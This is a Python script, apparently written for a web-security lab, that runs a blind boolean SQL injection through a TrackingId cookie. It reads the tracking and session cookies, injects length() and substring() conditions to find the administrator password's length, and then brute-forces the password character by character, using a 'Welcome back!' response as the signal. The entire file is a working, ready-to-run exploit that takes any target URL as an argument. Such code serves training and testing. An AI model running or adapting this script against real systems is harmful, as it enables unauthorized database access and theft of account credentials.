from pwn import *
import requests, signal, time, pdb, sys, string, json,re
from requests.exceptions import HTTPError,MissingSchema

def def_handler(sig,frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT, def_handler)

def getTrackingSession(main_url):
    p0=log.progress("Http Header")
    p0.status("Obtaining TrakingID and session from header")
    time.sleep(2)
    try:
        response = requests.get(main_url, timeout=2)
        if response.status_code != 200:
            response.raise_for_status()
        objectT = response.headers['Set-cookie'].split()
        #print(objeto[0].split('=;')[1])
        trackingID= re.findall(r"[\w']+", objectT[0])[1]
        session=re.findall(r"[\w']+", objectT[3])[1]
        p0.success(F"Tracking ID: {trackingID}, session: {session}")
    except (HTTPError, MissingSchema)  as err:
        p0.failure(str(err))
        return False

    return [trackingID, session];

def sizePassword(main_url,tracking_id,session):
    p0=log.progress("Password Size")
    it=1
    while(True):
        cookies = {
                    'TrackingId': F"{tracking_id}' and (select 'a' from users where username = 'administrator' and length(password)>={it})='a",
                    'session': F'{session}'
                }
        #print(cookies['TrackingId'])
        response = requests.get(main_url,cookies=cookies,  timeout=2)
        if "Welcome back!" not in response.text:
            p0.success(F'{it-1}')
            break
        p0.status(F'{it}')
        it+=1

    return it

    

def makeRequest(main_url,tracking_id,session,size):
    characters = string.ascii_lowercase + string.digits
    password=""
    p1= log.progress("Brute Force")
    p1.status("Initializing brute force attack") 
    time.sleep(2)

    p2=log.progress("Password")

    for position in range(1,size):
        for character in characters:
            cookies = {
                'TrackingId': F"{tracking_id}' and (select substring(password,{position},1) from users where username = 'administrator')='{character}",
                'session': F'{session}'
            }

            p1.status(cookies['TrackingId'])

            response = requests.get(main_url,cookies=cookies,  timeout=2)
            #print (response.headers)

            if "Welcome back!" in response.text:
                password += character
                p2.status(password)
                break
    p2.success(password)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])

    url = sys.argv[1]
    lResp = getTrackingSession(url)
    if lResp is not False:
        n= sizePassword(url, lResp[0],lResp[1])
        makeRequest(url, lResp[0],lResp[1],n)
